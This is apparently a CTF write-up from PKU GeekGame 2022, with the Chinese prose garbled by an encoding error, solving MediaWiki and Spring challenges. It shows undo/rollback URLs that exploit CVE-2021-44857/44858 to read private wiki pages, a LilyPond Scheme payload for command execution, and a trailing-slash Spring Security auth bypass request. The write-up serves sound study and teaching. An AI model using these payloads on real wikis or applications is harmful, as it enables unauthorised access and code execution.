<p><a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T297322">CVE-2021-44857, CVE-2021-44858: Unauthorized users can undo edits on any protected page and view contents of private wikis using mcrundo</a></p>
<blockquote>
<p>The mcrundo action seems to do no checks at all for if users have  permission to perform edits on that page. This means any user can undo  edits on any protected page, such as the main page. E.g. this URL: <a target="_blank" rel="noopener" href="https://commons.wikimedia.org/w/index.php?title=Main_Page&amp;action=mcrundo&amp;undo=603639572&amp;undoafter=600544238">https://commons.wikimedia.org/w/index.php?title=Main_Page&amp;action=mcrundo&amp;undo=603639572&amp;undoafter=600544238</a> will allow you to undo an edit on the main page.</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/r/c/mediawiki/core/+/747596">747596: SECURITY: Fix permissions checks in undo actions</a></p>
<blockquote>
<p>Both traditional action=edit&amp;undo= and the newer action=mcrundo/action=mcrrestore endpoints suffer from a flaw that allows for leaking entire private wikis by enumerating through revision IDs when at least one page was publicly accessible via $wgWhitelistRead. This is <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44858">CVE-2021-44858</a>. </p>
<p><a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/r/q/05f06286f4def">05f06286f4def</a> removed the restriction that user-supplied undo IDs belong ot the same page, and was then copied into mcrundo. This check has been restored by using RevisionLookup::getRevisionByTitle(), which returns null if the revid is on a different page. This will break the workflow outlined in <a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T58184">T58184</a>, but that could be restored in the future with better access control checks. </p>
<p>action=mcrundo/action=restore suffer from an additional flaw that allows for bypassing most editing restrictions. It makes no check on whether user has the â€˜editâ€™ permission or can even edit that page (page protection, etc.). This is <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44857">CVE-2021-44857</a>. </p>
<p>This has been fixed by requiring the â€˜editâ€™ permission to even invoke the action (via Action::getRestriction()), as well as checking the userâ€™s permissions to edit the specific page before saving. </p>
<p>The EditFilterMergedContent hook is also run against the revision before itâ€™s saved so SpamBlacklist, AbuseFilter, etc. have a chance to review the new page contents before saving. </p>
<p>Kudos to Dylsss for the identification and report. </p>
<p>Bug: <a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T297322">T297322</a> </p>
<p>Co-authored-by: Taavi VÃ¤Ã¤nÃ¤nen <a href="mailto:hi@taavi.wtf">hi@taavi.wtf</a> </p>
<p>Change-Id: <a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/r/q/I496093adfcf5a0e30774d452b650b751518370ce">I496093adfcf5a0e30774d452b650b751518370ce</a></p>
</blockquote>
<p>å¦‚æœ action ä¸º <code>edit</code> æˆ–è€…æ–°çš„ <code>mcrundo</code> / <code>mcrrestore</code> è¿™äº›ï¼Œå› ä¸ºåœ¨ <a href="includes/EditPage.php">includes/EditPage.php</a> å’Œ <a href="includes/actions/McrUndoAction.php">includes/actions/McrUndoAction.php</a> æ²¡æœ‰å¯¹é¡µé¢çš„ edit è¡Œä¸ºè¿›è¡Œæƒé™é™åˆ¶ä»è€Œå¯ä»¥ç»•è¿‡æ¥è¯»ç§æœ‰é¡µé¢</p>
<p>è¿™é‡Œçš„æ„æ€å¤§æ¦‚æ˜¯è¦ç©·ä¸¾ revision IDsï¼Œæœ‰ç‚¹åƒä¸Šä¸ªæœˆ hackergame é‡Œé‚£ä¸ª Wiki é‡Œç¾¤å‹å°è¯•è¿‡ä½†å¤±è´¥äº†çš„æ–¹æ³•</p>
<p>çˆ†ç ´ä¸€ä¸‹ undo å’Œ undoafterï¼Œç›²çŒœ undo æ˜¯ä¹‹å‰çš„ï¼Œundoafter æ˜¯ä¿®æ”¹åçš„</p>
<p>å‘ç°æ˜¯ <a target="_blank" rel="noopener" href="https://prob07-xxx.geekgame.pku.edu.cn/w/index.php?title=%E9%A6%96%E9%A1%B5&amp;action=mcrundo&amp;undo=1&amp;undoafter=2">https://prob07-xxx.geekgame.pku.edu.cn/w/index.php?title=%E9%A6%96%E9%A1%B5&amp;action=mcrundo&amp;undo=1&amp;undoafter=2</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125045216430.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125045353633.png"></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥æ˜¯ <code>edit</code></p>
<p><a target="_blank" rel="noopener" href="https://prob07-xxx.geekgame.pku.edu.cn/w/index.php?title=%E9%A6%96%E9%A1%B5&amp;action=edit&amp;undo=1&amp;undoafter=2">https://prob07-xxx.geekgame.pku.edu.cn/w/index.php?title=%E9%A6%96%E9%A1%B5&amp;action=edit&amp;undo=1&amp;undoafter=2</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125045418700.png"></p>
<p><code>flag{insecure_01d_mediavviki}</code></p>
<p>å½“ç„¶è¿˜å¯ä»¥ç”¨å¦ä¸€ä¸ª CVEï¼Œé€šè¿‡ rollback æ¥è¯» private wiki çš„å†…å®¹</p>
<pre class="line-numbers language-none"><code class="language-none">https://prob07-xxx.geekgame.pku.edu.cn/index.php?action=rollback&amp;from={{:Flag}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221129100715725.png"></p>
<h4 id="æ¥æˆ‘å®¶åšå®¢å§"><a href="#æ¥æˆ‘å®¶åšå®¢å§" class="headerlink" title="æ¥æˆ‘å®¶åšå®¢å§"></a>æ¥æˆ‘å®¶åšå®¢å§</h4><p>è¿™é—®ç›²çŒœå°±æ˜¯æ‰©å±•ç¨‹åºé”…äº†èƒ½ä»»æ„è¯»æ–‡ä»¶ç”šè‡³ RCEï¼Œè€Œè¿™é‡Œå°±ä¸€ä¸ª Scoreï¼Œæœä¸€ä¸‹å°±æœåˆ°äº†</p>
<p>æ­£å¥½æ”¾äº†æç¤º</p>
<blockquote>
<p><strong>ç¬¬äºŒé˜¶æ®µæç¤ºï¼š</strong></p>
<ul>
<li>æä¾›ä»¥ä¸‹é…ç½®æ–‡ä»¶ï¼š<a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob07/Dockerfile">Dockerfile</a>ã€<a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob07/LocalSettings.php">LocalSettings.php</a>ã€‚</li>
<li>2021å¹´12æœˆï¼ŒMediaWikiçˆ†å‡º<strong>ä¸€ç³»åˆ—</strong>æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…è®¿é—®ç§æœ‰ wiki çš„ä»»ä½•å†…å®¹ï¼Œä»¥åŠä¿®æ”¹å…¬å¼€ wiki çš„ä»»ä½•é¡µé¢ï¼ˆä¾‹å¦‚ç»´åŸºç™¾ç§‘çš„é¦–é¡µï¼‰ã€‚æ‰€å¹¸ï¼Œæ¼æ´è¢«å‘ç°å¹¶ä¿®å¤å‰æ²¡æœ‰é€ æˆå·²çŸ¥çš„è´Ÿé¢å½±å“ã€‚</li>
<li>2020å¹´7æœˆï¼ŒScoreæ‰©å±•çˆ†å‡ºæ¼æ´ï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å‘ç°ä¸ä¹…ï¼ŒScoreæ‰©å±•å°±åœ¨ç»´åŸºåª’ä½“è®¡åˆ’ç¦ç”¨äº†ã€‚åœ¨æ­¤æ¼æ´çš„ä¿®å¤è¿‡ç¨‹ä¸­ï¼Œåˆå‘ç°äº†ä¸€ç³»åˆ—ç»•è¿‡æ–¹æ³•ã€‚ç»´åŸºåª’ä½“è®¡åˆ’çš„æœ€ç»ˆçš„å¤„ç†æ–¹æ³•æ˜¯æŠŠLilyPondæ”¾åˆ°ä¸€ä¸ªç‹¬ç«‹çš„å®¹å™¨è¿è¡Œï¼›13ä¸ªæœˆåï¼ˆ2021å¹´8æœˆï¼‰ï¼ŒScoreæ‰©å±•æ‰è¢«é‡æ–°å¯ç”¨ã€‚</li>
<li>å¯ä»¥å‚è€ƒMediaWiki bug report systemå¯¹ç›¸å…³æ¼æ´çš„è®¨è®ºã€‚</li>
</ul>
</blockquote>
<p>é¡ºä¾¿ï¼Œè¿™ä¸ª <code>Dockerfile</code> ä¹Ÿæç¤ºäº† <code>old_id=2</code>ï¼Œä¹Ÿå°±æ˜¯ä¸Šä¸€é—®åº”è¯¥å– <code>undoafter=2</code> äº†</p>
<pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> mediawiki:1.34</span>

<span class="token instruction"><span class="token keyword">RUN</span> sed -i <span class="token string">"s@http://.*deb.debian.org@http://mirrors.aliyun.com@g"</span> /etc/apt/sources.list</span>
<span class="token instruction"><span class="token keyword">RUN</span> sed -i <span class="token string">"s@http://.*security.debian.org@http://mirrors.aliyun.com@g"</span> /etc/apt/sources.list</span>
<span class="token instruction"><span class="token keyword">RUN</span> apt-get update</span>
<span class="token instruction"><span class="token keyword">RUN</span> apt-get install -y sqlite3 lilypond</span>
<span class="token instruction"><span class="token keyword">RUN</span> git clone https://gitlab.com/debugger-zhang/Score.git /var/www/html/extensions/Score --depth=1</span>
<span class="token instruction"><span class="token keyword">COPY</span> my_wiki.sqlite /var/www/data/</span>
<span class="token instruction"><span class="token keyword">COPY</span> my_wiki_jobqueue.sqlite /var/www/data/</span>
<span class="token instruction"><span class="token keyword">COPY</span> my_wiki_l10n_cache.sqlite /var/www/data/</span>
<span class="token instruction"><span class="token keyword">RUN</span> chown www-data:www-data /var/www/data/*</span>
<span class="token instruction"><span class="token keyword">RUN</span> mkdir /var/www/data/locks &amp;&amp; chown www-data:www-data /var/www/data/locks</span>
<span class="token instruction"><span class="token keyword">COPY</span> .htaccess /var/www/data/</span>
<span class="token instruction"><span class="token keyword">COPY</span> LocalSettings.php /var/www/html/</span>
<span class="token instruction"><span class="token keyword">COPY</span> flag1 /</span>
<span class="token instruction"><span class="token keyword">COPY</span> flag2 /</span>
<span class="token instruction"><span class="token keyword">RUN</span> rm -rf /var/www/html/mw-config</span>
<span class="token instruction"><span class="token keyword">RUN</span> sqlite3 -line /var/www/data/my_wiki.sqlite <span class="token string">"UPDATE text SET old_text='You can use the following username and password to login:'||char(10)||'* User name: Flag1'||char(10)||'* Password: `cat /flag1`'||char(10)||char(10)||'Try RCE to find Flag 2.' WHERE old_id=2"</span></span>
<span class="token instruction"><span class="token keyword">RUN</span> php /var/www/html/maintenance/changePassword.php --user=Flag1 --password=`cat /flag1`</span>
<span class="token comment">#RUN sed -i "s/127.0.0.1:8080/$hackergame_host/g" LocalSettings.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong><a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Extension:Score/2021_security_advisory">Extension:Score/2021 security advisory</a></strong></p>
<blockquote>
<p>In summary, the following security issues were discovered:</p>
<ul>
<li>CVE-2020-29007, MediaWiki Score allows executing arbitrary Scheme code</li>
<li>CVE-2020-17353, LilyPond allows arbitrary PostScript and does not use -dSAFER<ul>
<li>Mitigated in Score by having MediaWiki run Ghostscript directly instead of relying on Lilypond, see <a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Score/%2B/615594">gerrit:615594</a>.</li>
<li><a target="_blank" rel="noopener" href="https://git.savannah.gnu.org/gitweb/?p=lilypond.git;a=commit;h=b84ea4740f3279516905c5db05f4074e777c16ff">Upstream fix</a></li>
</ul>
</li>
<li>CVE-2020-17367, CVE-2020-17368: Vulnerabilities in firejail due to â€“output<ul>
<li>Mitigated in MediaWiki by disallowing usage of parameters named â€“output, see <a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/r/629729">gerrit:629729</a>.</li>
<li><a target="_blank" rel="noopener" href="https://github.com/netblue30/firejail/releases/tag/0.9.62.2">Upstream fixes included in 0.9.62.2</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T259210">CVE-2020-17354: not yet publicly disclosed</a></li>
<li><a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T260225">T260225: not yet publicly disclosed, no CVE assigned yet</a></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T257062">T257062</a> and its subtasks was where most coordination and discussion happened.  Some more discussion about improving LilyPondâ€™s security took place on  the <a target="_blank" rel="noopener" href="https://lists.gnu.org/archive/html/lilypond-devel/2020-10/msg00096.html">lilypond-devel mailing list</a> and in private email.</p>
<hr>
<p><strong>Re-enabling Score</strong></p>
<p>Now in August 2021, Wikimedia has re-enabled Score after isolating LilyPond and other external binaries using <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Shellbox">Shellbox</a>.</p>
<p>On non-Wikimedia wikis: It is recommended to only enable Score  and LilyPond on your wiki if you absolutely trust everyone who has  editing privileges, or if you use <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Shellbox">Shellbox</a>. Even with â€œsafe modeâ€ enabled, it is not safe to allow LilyPond to  process arbitrary input without containment. Ensure youâ€™re using a  recent version of LilyPond (2.22.0+) or a distribution package (e.g.  from Debian) that contains the security fixes. All fixes have been  backported to the REL1_36 branch of Score and can be downloaded from <a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/g/mediawiki/extensions/Score">Git</a> or the <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Special:ExtensionDistributor/Score">ExtensionDistributor</a>.</p>
</blockquote>
<p>è¿™é¢˜ç”¨çš„ LilyPond 2.18.2ï¼ŒScore 0.3.0 (dd534e1) 2019å¹´9æœˆ17æ—¥ (äºŒ) 13:38</p>
<p>è€ƒè™‘åˆ°è¿™ä¸ªç‰ˆæœ¬è¿™ä¹ˆè€ï¼Œå¤§æ¦‚ç‡å°±æ˜¯è¿™å † CVE é‡Œçš„äº†<em>ï¼ˆæ€ä¹ˆè¿˜æœ‰æœªæŠ«éœ²çš„å•Š</em> <del>å®³äººä¸æµ…å•Š</del></p>
<p>åŸæ¥ LilyPond (è·èŠ±æ± ) æ˜¯ä¸€ä¸ªéŸ³ä¹é›•ç‰ˆè½¯ä»¶ï¼Œä¹</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125050926742.png"></p>
<p><a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T257062">Lilypond seemingly not subject to restrictions (CVE-2020-29007)</a></p>
<p>ä¸Šä¸€é¢˜æç¤ºæˆ‘ä»¬å¯ä»¥ç”¨ <code>Flag1</code> / <code>flag{insecure_01d_mediavviki}</code> æ¥ç™»å½•</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125052322606.png"></p>
<p>çœ‹æ–‡æ¡£ <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Extension:Score/zh">mediawiki æ‰©å±•:ä¹è°±</a></p>
<p>è¯•äº†ä¸‹ä¸èƒ½åŠ  <code>sound</code> <code>vorbis</code> è¿™äº›å‚æ•°ï¼Œå¦åˆ™ä¼šå› ä¸ºæ²¡è£… <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Extension:TimedMediaHandler">TimedMediaHandleræ‰©å±•</a>ï¼Œæ— æ³•è¿›è¡ŒéŸ³é¢‘è½¬æ¢ï¼Œå°±æ¸²æŸ“ä¸å‡ºæ¥ã€‚</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125055304190.png"></p>
<p>æ‰€ä»¥ç›´æ¥å»æ‰è¿™äº›å‚æ•°å°±å¥½äº†</p>
<p>æ„é€ ä¸ª payload å°† flag å†™å…¥ web ç›®å½•ä¸‹</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>score</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lilypond<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>\new Staff &lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>{c^#</span>
<span class="token attr-name">(number-</span><span class="token punctuation">&gt;</span></span>string (system "cat /flag2 &gt; /var/www/html/flag2"))
}&gt;&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>score</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125055514375.png"></p>
<p>è¿™é‡Œåº”è¯¥æ˜¯æ‰§è¡Œåè¿”å›å€¼ä¸º 0</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125055459138.png"></p>
<p><code>flag{li1yp0nd_can_1ead_to_rce}</code></p>
<p>æœ€åï¼Œæ‰§è¡Œä¸ª ps ç„ä¸€çœ¼</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125060033526.png"></p>
<blockquote>
<p>èµ›åå‘ç°å¯ä»¥ç›´æ¥ç”¨ä¸‹é¢çš„ä»£ç æŠŠ flag æ¸²æŸ“å‡ºæ¥</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>score</span><span class="token punctuation">&gt;</span></span>\new Staff &lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>{c^#</span>
<span class="token attr-name">(object-</span><span class="token punctuation">&gt;</span></span>string (call-with-input-file "/flag2" read))
}&gt;&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>score</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221129100516183.png"></p>
<p><code>^</code>åæ˜¯éŸ³ç¬¦cçš„ä¸Šæ ‡ï¼Œ<code>#</code>æ˜¯Schemeè¯­å¥çš„å¼€å§‹æ ‡å¿—</p>
</blockquote>
<h3 id="ä¼ä¸šçº§ç†è§£"><a href="#ä¼ä¸šçº§ç†è§£" class="headerlink" title="ä¼ä¸šçº§ç†è§£"></a>ä¼ä¸šçº§ç†è§£</h3><blockquote>
<blockquote>
<p>æœ¬é¢˜ï¼ˆä¸å«ä»¥ä¸‹é¢˜é¢ï¼‰ç”±èµåŠ©å•†èš‚èšé›†å›¢æä¾›ã€‚</p>
</blockquote>
<p>å¤§å‹ä¼ä¸šçš„è½¯ä»¶å¼€å‘æ–¹å¼ä¸å¼€æºé¡¹ç›®æ˜¯ä¸åŒçš„ã€‚ åªæœ‰æ‹¥æœ‰äº†å¤§å‹ä¼ä¸šç‰¹æœ‰çš„ä¼ä¸šçº§ç†è§£ï¼Œæ‰èƒ½å¤Ÿæ›´å¥½åœ°è®©äº§å“ä¸ºå®¢æˆ·èµ‹èƒ½ï¼Œå®ç°å‰ç«¯ä¸åå°çš„è§£è€¦ï¼Œå°†éœ€æ±‚å¯¹é½åˆ°åœºæ™¯çš„å®Œæ•´é“¾è·¯ä¸­ï¼Œå®ç°ä»åº•å±‚åˆ°ç›ˆåˆ©å±‚çš„æ‰“é€šâ€¦â€¦</p>
<p>æœ‰äº›ä¼ä¸šé€‰æ‹©äº†åšå¦‚ç£çŸ³çš„ Java 8 è¯­è¨€ï¼Œåªæœ‰åœ¨æ•°åäº¿è®¾å¤‡ä¸Šéƒ½èƒ½è¿è¡Œçš„ç¯å¢ƒæ‰æ˜¯ç¨³å®šå¯é çš„ç¯å¢ƒã€‚</p>
<p>æœ‰äº›ä¼ä¸šé€‰æ‹©äº†å†ä¹…å¼¥æ–°çš„ Spring Frameworkï¼Œæ¯•ç«Ÿåªéœ€è¦å†™å‡ è¡Œé…ç½®å°±èƒ½ä¸ºä¸€ä¸ªå·¨å¤§çš„ Web App å¢åŠ è‡ªåŠ¨ç”Ÿæˆçš„ç™»å½•é¡µé¢ï¼Œå·¥ç¨‹å¸ˆæ”¾å¿ƒï¼Œäº§å“ç»ç†ä¹Ÿæ”¾å¿ƒã€‚</p>
<p>æœ‰äº›ä¼ä¸šé€‰æ‹©äº†è®©ç¨‹åºå‘˜ç”¨ A4 çº¸ä¹¦é¢æ‰“å°ä»£ç æ¥è€ƒæ ¸å·¥ä½œé‡ï¼Œå› ä¸º â€œTalk is cheap, show me your code.â€ æ˜¯æ¯åç§‘ç­ç¨‹åºå‘˜çš„ä¿¡æ¡ã€‚</p>
<p>æœ‰äº›ä¼ä¸šé€‰æ‹©äº†ç”¨æ¯•ä¸šå…¸ç¤¼æ¬¢é€æ¯ä¸€åå‘˜å·¥ï¼Œå³å°†æ¯•ä¸šçš„ You é…±å¿ƒæœ‰ä¸ç”˜ï¼Œæ‘¸äº†æ‘¸èƒ¸å‰çš„å·¥ç‰Œï¼Œåœ¨ä¼šè®®å®¤çš„æ¡Œä¸Šæ¡èµ·äº†ä¸¤å¼ åŒäº‹ä¸Šå‘¨æ‰“å°å‡ºæ¥çš„ä»£ç ï¼Œå¸Œæœ›èƒ½å¤Ÿæˆä¸ºè‡ªå·±èŒä¸šé“è·¯ä¸Šçš„ä¸€ä»½çºªå¿µã€‚</p>
<p>ä½ Youï¼Œæœ‰ç€ä¼ä¸šçº§ç†è§£å—ï¼Ÿ</p>
<p><strong>è¡¥å……è¯´æ˜ï¼š</strong>æœ¬é¢˜ä¸éœ€è¦çˆ†ç ´å¯†ç ã€‚ä¸‰ä¸ª Flag åˆ†åˆ«éœ€è¦ç»•è¿‡ç™»å½•é¡µé¢è®¿é—®ç®¡ç†åå°ã€è®¿é—®æœ¬æœºä¸Šçš„ bonus æœåŠ¡ã€é€šè¿‡ bonus æœåŠ¡åœ¨æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><strong>æ³¨æ„ï¼šé¢˜ç›®è¿”å›çš„ Flag æ ¼å¼å¯èƒ½å½¢å¦‚ <code>flag1{...}</code>ï¼Œè¯·æ”¹æˆ <code>flag{...}</code> åæäº¤ã€‚</strong></p>
<p>ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://prob08-manager.geekgame.pku.edu.cn/docker-manager/start?xxx">è®¿é—®é¢˜ç›®ç½‘é¡µ</a> ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob08/prob08-src.pdf">ä¸‹è½½éƒ¨åˆ†é¢˜ç›®æºç </a></p>
</blockquote>
<h4 id="èµ‹èƒ½ç®¡ç†åå°"><a href="#èµ‹èƒ½ç®¡ç†åå°" class="headerlink" title="èµ‹èƒ½ç®¡ç†åå°"></a>èµ‹èƒ½ç®¡ç†åå°</h4><p>ç»•è¿‡ç™»å½•é¡µé¢è®¿é—®ç®¡ç†åå°</p>
<p>å‚è€ƒ <a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/09/22/Spring%20Security%E7%9A%84%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95auth%20bypass%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%AC%94%E8%AE%B0/">Spring Securityçš„ä¸€ä¸ªç®€å•auth bypasså’Œä¸€äº›å°ç¬”è®°</a></p>
<p>åœ¨urlæœ€ååŠ ä¸ª <code>/</code> åç¼€ï¼Œå°±èƒ½auth bypassäº†</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124051232086.png"></p>
<p>äºæ˜¯ç›´æ¥è®¿é—® <a target="_blank" rel="noopener" href="http://prob08-fyjvhi7n.geekgame.pku.edu.cn/admin/">http://prob08-fyjvhi7n.geekgame.pku.edu.cn/admin/</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124051259229.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124051310348.png"></p>
<p>è¯•è¯•è¿™ä¸ª query æœ‰å•¥ç”¨ï¼Œè¿™ä¸‰ä¸ªé€‰é¡¹æ€»æœ‰ä¸€ä¸ªæœ‰æˆå§ï¼</p>
<p>è¯•åˆ° <code>PKU_GeekGame</code>ï¼Œå‡ºäº† flag1ï¼</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124051752143.png"></p>
<p><strong>payload:</strong></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/admin/query/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">prob08-fyjvhi7n.geekgame.pku.edu.cn</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://prob08-fyjvhi7n.geekgame.pku.edu.cn/login</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">JSESSIONID=9DFC4E40600AB403B62117862E63EB8B</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">17</span></span>

type=PKU_GeekGame<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/16798843.html">Javaå®‰å…¨ä¹‹Spring Securityç»•è¿‡æ€»ç»“</a></p>
<p><a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/09/22/Spring%20Security%E7%9A%84%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95auth%20bypass%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%AC%94%E8%AE%B0/">Spring Securityçš„ä¸€ä¸ªç®€å•auth bypasså’Œä¸€äº›å°ç¬”è®°</a></p>
</blockquote>
<h4 id="ç›˜æ´»ä¸šåŠ¡å¢é•¿"><a href="#ç›˜æ´»ä¸šåŠ¡å¢é•¿" class="headerlink" title="ç›˜æ´»ä¸šåŠ¡å¢é•¿"></a>ç›˜æ´»ä¸šåŠ¡å¢é•¿</h4><p>çœ‹æºç </p>
<p><a target="_blank" rel="noopener" href="http://prob08-fyjvhi7n.geekgame.pku.edu.cn/admin/source_bak/">http://prob08-fyjvhi7n.geekgame.pku.edu.cn/admin/source_bak/</a></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">WebClient</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AdminController</span> <span class="token punctuation">{</span>

    <span class="token class-name">WebClient</span> webClient <span class="token operator">=</span> <span class="token class-name">WebClient</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">baseUrl</span><span class="token punctuation">(</span><span class="token string">"http://localhost:8079/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/admin/{index}"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">adminIndex</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"index"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> index<span class="token punctuation">,</span> <span class="token class-name">String</span> auth<span class="token punctuation">,</span> <span class="token class-name">QueryBean</span> queryBean<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;</span> index<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
